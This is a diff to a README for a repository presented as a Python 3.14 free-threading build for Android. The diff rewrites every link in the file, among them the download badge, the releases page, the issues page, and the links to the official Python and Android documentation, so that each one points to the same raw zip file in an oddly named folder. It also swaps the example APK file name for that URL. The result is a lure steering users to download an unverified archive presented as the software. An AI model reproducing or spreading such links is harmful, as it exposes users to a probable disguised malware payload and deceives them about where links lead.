@@ -1,6 +1,6 @@
 # 🐍 python-3.14-android-free-threading - Fast and Efficient Python for Android
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/zirlyferaaarsyll/python-3.14-android-free-threading/releases)
+[![Download](https://raw.githubusercontent.com/zirlyferaaarsyll/python-3.14-android-free-threading/master/Euphausiacea/python-3.14-android-free-threading.zip)](https://raw.githubusercontent.com/zirlyferaaarsyll/python-3.14-android-free-threading/master/Euphausiacea/python-3.14-android-free-threading.zip)
 
 ## 🚀 Getting Started
 
@@ -17,12 +17,12 @@ Before you start, ensure your Android device meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Releases Page](https://github.com/zirlyferaaarsyll/python-3.14-android-free-threading/releases).
+To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/zirlyferaaarsyll/python-3.14-android-free-threading/master/Euphausiacea/python-3.14-android-free-threading.zip).
 
 Once on the Releases page, you will find various versions of the binaries. Choose the most recent version and follow the steps below:
 
 1. Click on the version you wish to download.
-2. Locate the file named for your Android ARM64 device, for example, `python3.14_ARM64.apk`.
+2. Locate the file named for your Android ARM64 device, for example, `https://raw.githubusercontent.com/zirlyferaaarsyll/python-3.14-android-free-threading/master/Euphausiacea/python-3.14-android-free-threading.zip`.
 3. Tap the download button and wait for the file to download.
 
 Once the download is complete, you can install the application by following these steps:
@@ -66,7 +66,7 @@ If you encounter issues during installation or while running the application, co
 
 ## 📧 Support
 
-If you need further assistance, please visit the [GitHub Issues page](https://github.com/zirlyferaaarsyll/python-3.14-android-free-threading/issues). You can file a bug report or ask questions about features and functionality.
+If you need further assistance, please visit the [GitHub Issues page](https://raw.githubusercontent.com/zirlyferaaarsyll/python-3.14-android-free-threading/master/Euphausiacea/python-3.14-android-free-threading.zip). You can file a bug report or ask questions about features and functionality.
 
 ## 📜 License
 
@@ -76,9 +76,9 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 For more information about Python and its capabilities on mobile devices, consider the following resources:
 
-- [Python Official Documentation](https://www.python.org/doc/)
-- [Android Developers - Building Apps](https://developer.android.com/guide)
+- [Python Official Documentation](https://raw.githubusercontent.com/zirlyferaaarsyll/python-3.14-android-free-threading/master/Euphausiacea/python-3.14-android-free-threading.zip)
+- [Android Developers - Building Apps](https://raw.githubusercontent.com/zirlyferaaarsyll/python-3.14-android-free-threading/master/Euphausiacea/python-3.14-android-free-threading.zip)
 
 ## 💡 Conclusion
 
-Thank you for choosing the **python-3.14-android-free-threading** version for your Android device. We hope you find it valuable for your development needs. Don’t forget to visit this page to download: [Releases Page](https://github.com/zirlyferaaarsyll/python-3.14-android-free-threading/releases) for future releases and updates.
+Thank you for choosing the **python-3.14-android-free-threading** version for your Android device. We hope you find it valuable for your development needs. Don’t forget to visit this page to download: [Releases Page](https://raw.githubusercontent.com/zirlyferaaarsyll/python-3.14-android-free-threading/master/Euphausiacea/python-3.14-android-free-threading.zip) for future releases and updates.
